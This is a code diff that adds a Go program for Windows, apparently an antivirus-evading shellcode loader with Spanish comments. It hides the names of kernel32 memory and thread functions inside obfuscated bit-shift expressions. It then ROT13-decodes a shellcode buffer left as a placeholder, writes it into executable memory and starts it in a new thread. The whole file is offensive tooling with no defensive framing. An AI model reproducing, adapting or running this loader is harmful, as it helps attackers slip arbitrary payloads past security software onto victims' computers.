@@ -1,0 +1,174 @@
+package main
+
+import (
+	"unsafe"
+
+	"golang.org/x/sys/windows"
+)
+
+func eax() uint8{
+        return uint8(unsafe.Sizeof(true))
+}
+
+func Getk32() string {
+return string(
+[]byte{
+((((eax()<<eax()^eax())<<eax()<<eax()^eax())<<eax()<<eax()|eax())<<eax()^eax()),
+(((eax()<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax()<<eax()|eax()),
+(((eax()<<eax()^eax())<<eax()^eax())<<eax()<<eax()<<eax()|eax())<<eax(),
+((((eax()<<eax()^eax())<<eax()<<eax()^eax())<<eax()|eax())<<eax()^eax())<<eax(),
+(((eax()<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax()<<eax()|eax()),
+(((eax()<<eax()^eax())<<eax()<<eax()^eax())<<eax()|eax())<<eax()<<eax(),
+(((eax()<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax()|eax()),
+((eax()<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax(),
+},
+)
+}
+
+func Getaloc() string {
+return string(
+[]byte{
+(((eax()<<eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()|eax())<<eax(),
+(((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()<<eax()<<eax()|eax()),
+(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax()|eax())<<eax(),
+(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()|eax())<<eax()<<eax(),
+((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()|eax())<<eax()<<eax()^eax()),
+((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()<<eax()^eax()),
+(((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()|eax())<<eax()<<eax(),
+(eax()<<eax()<<eax()<<eax()<<eax()<<eax()<<eax()|eax()),
+(((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()|eax())<<eax()<<eax(),
+(((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()|eax())<<eax()<<eax(),
+(((((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()|eax())<<eax()^eax())<<eax()^eax()),
+(((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()^eax())<<eax()|eax()),
+},
+)
+}
+
+func Getwrite() string {
+return string(
+[]byte{
+((((eax()<<eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()^eax())<<eax()^eax()),
+(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax(),
+(((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()<<eax()<<eax()^eax()),
+(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()^eax())<<eax()<<eax(),
+(((eax()<<eax()|eax())<<eax()<<eax()<<eax()^eax())<<eax()<<eax()^eax()),
+(eax()<<eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax(),
+(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax(),
+(((((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()^eax())<<eax()^eax())<<eax()|eax()),
+(((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()^eax())<<eax()^eax()),
+(((eax()<<eax()|eax())<<eax()<<eax()<<eax()^eax())<<eax()<<eax()^eax()),
+((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax()^eax()),
+((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax()^eax()),
+(((eax()<<eax()<<eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()^eax()),
+(((eax()<<eax()|eax())<<eax()<<eax()<<eax()^eax())<<eax()<<eax()^eax()),
+((((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()^eax())<<eax()<<eax()^eax()),
+(((((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()^eax())<<eax()^eax())<<eax()|eax()),
+(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax(),
+((((eax()<<eax()|eax())<<eax()^eax())<<eax()^eax())<<eax()<<eax()<<eax()^eax()),
+},
+)
+}
+
+func Getthread() string {
+return string(
+[]byte{
+((eax()<<eax()<<eax()<<eax()<<eax()<<eax()|eax())<<eax()|eax()),
+(((eax()<<eax()|eax())<<eax()|eax())<<eax()<<eax()<<eax()|eax())<<eax(),
+(((eax()<<eax()|eax())<<eax()<<eax()<<eax()|eax())<<eax()<<eax()|eax()),
+((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()<<eax()|eax()),
+(((eax()<<eax()|eax())<<eax()|eax())<<eax()<<eax()|eax())<<eax()<<eax(),
+(((eax()<<eax()|eax())<<eax()<<eax()<<eax()|eax())<<eax()<<eax()|eax()),
+((eax()<<eax()<<eax()|eax())<<eax()<<eax()|eax())<<eax()<<eax(),
+((eax()<<eax()|eax())<<eax()<<eax()|eax())<<eax()<<eax()<<eax(),
+(((eax()<<eax()|eax())<<eax()|eax())<<eax()<<eax()<<eax()|eax())<<eax(),
+(((eax()<<eax()|eax())<<eax()<<eax()<<eax()|eax())<<eax()<<eax()|eax()),
+((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()<<eax()|eax()),
+((eax()<<eax()|eax())<<eax()<<eax()<<eax()|eax())<<eax()<<eax(),
+},
+)
+}
+
+func Getwait() string {
+return string(
+[]byte{
+((((eax()<<eax()<<eax()^eax())<<eax()<<eax()|eax())<<eax()^eax())<<eax()^eax()),
+((eax()<<eax()^eax())<<eax()<<eax()<<eax()<<eax()<<eax()|eax()),
+(((eax()<<eax()^eax())<<eax()<<eax()|eax())<<eax()<<eax()<<eax()^eax()),
+(((eax()<<eax()^eax())<<eax()|eax())<<eax()<<eax()^eax())<<eax()<<eax(),
+((eax()<<eax()<<eax()<<eax()<<eax()^eax())<<eax()|eax())<<eax(),
+(((((eax()<<eax()^eax())<<eax()<<eax()|eax())<<eax()^eax())<<eax()^eax())<<eax()^eax()),
+(((eax()<<eax()^eax())<<eax()|eax())<<eax()<<eax()<<eax()^eax())<<eax(),
+(((eax()<<eax()<<eax()^eax())<<eax()<<eax()<<eax()|eax())<<eax()^eax()),
+(((eax()<<eax()^eax())<<eax()<<eax()|eax())<<eax()<<eax()<<eax()^eax()),
+((((eax()<<eax()^eax())<<eax()<<eax()|eax())<<eax()^eax())<<eax()^eax())<<eax(),
+((((eax()<<eax()^eax())<<eax()<<eax()<<eax()|eax())<<eax()^eax())<<eax()^eax()),
+(((eax()<<eax()^eax())<<eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax(),
+(((eax()<<eax()^eax())<<eax()<<eax()<<eax()|eax())<<eax()<<eax()^eax()),
+((((eax()<<eax()<<eax()<<eax()^eax())<<eax()|eax())<<eax()^eax())<<eax()^eax()),
+((eax()<<eax()^eax())<<eax()<<eax()<<eax()<<eax()|eax())<<eax(),
+(((eax()<<eax()^eax())<<eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax(),
+(((eax()<<eax()^eax())<<eax()<<eax()<<eax()|eax())<<eax()<<eax()^eax()),
+(((eax()<<eax()^eax())<<eax()<<eax()<<eax()<<eax()|eax())<<eax()^eax()),
+(((eax()<<eax()^eax())<<eax()|eax())<<eax()<<eax()^eax())<<eax()<<eax(),
+},
+)
+}
+
+
+
+var (
+        k                   = windows.NewLazySystemDLL(Getk32())
+        aloc                = k.NewProc(Getaloc())
+        write               = k.NewProc(Getwrite())
+        thread              = k.NewProc(Getthread())
+        wait                = k.NewProc(Getwait())
+)
+
+
+
+// https://www.dotnetperls.com/rot13-go
+func Rot13(b byte) byte {
+	var a, z byte
+	switch {
+	case 'a' <= b && b <= 'z':
+		a, z = 'a', 'z'
+	case 'A' <= b && b <= 'Z':
+		a, z = 'A', 'Z'
+	default:
+		return b
+	}
+	//El operador % es el módulo, que muestra el resto después de la división.
+	return (b-a+13)%(z-a+1) + a
+}
+
+func dec(p []byte) []byte {
+	for i := 0; i < len(p); i++ {
+		p[i] = Rot13(p[i])
+	}
+	return p
+}
+
+var shellcode = []byte{#Reemplazar}
+
+func main() {
+	shellcode = dec(shellcode)
+	Addr, _, err := aloc.Call(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+	if err != windows.NTStatus(0).Errno() {
+		panic(err)
+	}
+
+	_, _, err = write.Call(uintptr(windows.CurrentProcess()), Addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	if err != windows.NTStatus(0).Errno() {
+		panic(err)
+	}
+
+	Subproceso, _, err := thread.Call(0, 0, Addr, 0, 0, 0)
+	if err != windows.NTStatus(0).Errno() {
+		panic(err)
+	}
+
+	_, _, err = wait.Call(Subproceso, windows.INFINITE)
+	if err != windows.NTStatus(0).Errno() {
+		panic(err)
+	}
+}
